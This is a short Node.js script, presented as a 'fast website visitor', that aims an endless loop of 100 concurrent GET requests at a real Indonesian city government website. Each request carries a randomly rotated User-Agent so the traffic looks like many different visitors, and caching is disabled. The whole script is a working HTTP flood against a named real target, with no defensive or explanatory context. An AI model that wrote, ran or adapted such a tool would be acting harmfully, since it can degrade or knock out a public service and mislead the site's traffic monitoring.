const fs = require('fs');
const axios = require('axios');
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(ua => ua.trim());
const config = {
    targetUrl: 'https://pekalongankota.go.id/',
    maxConcurrent: 100
};
const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];
async function makeVisit(userAgent) {
    try {
        const response = await axios({
            url: config.targetUrl,
            method: 'GET',
            headers: {
                'User-Agent': userAgent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive'
            },
            timeout: 5000
        });

        console.log(`[SUCCESS] Visit berhasil dengan UA: ${userAgent.substring(0, 50)}...`);
        return true;
    } catch (error) {
        console.error(`[ERROR] Gagal visit:`, error.message);
        return false;
    }
}
async function runVisitor() {
    console.log('Starting fast website visitor...');
    console.log(`Loaded ${userAgents.length} user agents`);
    let successCount = 0;
    let failCount = 0;
    while (true) {
        const visitPromises = [];
        for (let i = 0; i < config.maxConcurrent; i++) {
            const userAgent = getRandomUserAgent();
            visitPromises.push(makeVisit(userAgent));
        }
        const results = await Promise.all(visitPromises);
        results.forEach(result => {
            if (result) successCount++;
            else failCount++;
        });
        console.log(`Stats - Success: ${successCount}, Failed: ${failCount}, Total: ${successCount + failCount}`);
    }
}
process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});
process.on('unhandledRejection', (error) => {
    console.error('Unhandled Rejection:', error);
});
runVisitor().catch(console.error);
